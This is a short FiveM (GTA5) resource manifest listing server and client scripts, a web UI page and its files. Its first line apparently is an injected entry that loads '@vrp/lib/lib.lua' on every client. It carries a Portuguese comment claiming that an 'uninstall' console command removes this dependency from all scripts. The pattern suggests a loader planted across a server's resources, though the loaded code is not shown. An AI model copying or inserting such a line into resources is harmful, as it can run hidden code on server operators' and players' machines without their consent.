client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

fx_version 'cerulean'
game 'gta5'

ui_page 'web-side/index.html'

server_scripts{
    '@vrp/lib/utils.lua',
    'server.lua'
}

client_scripts{
    '@vrp/lib/utils.lua',
    'client.lua'
}

files{
    'web-side/*',
    'web-side/**/*'
}              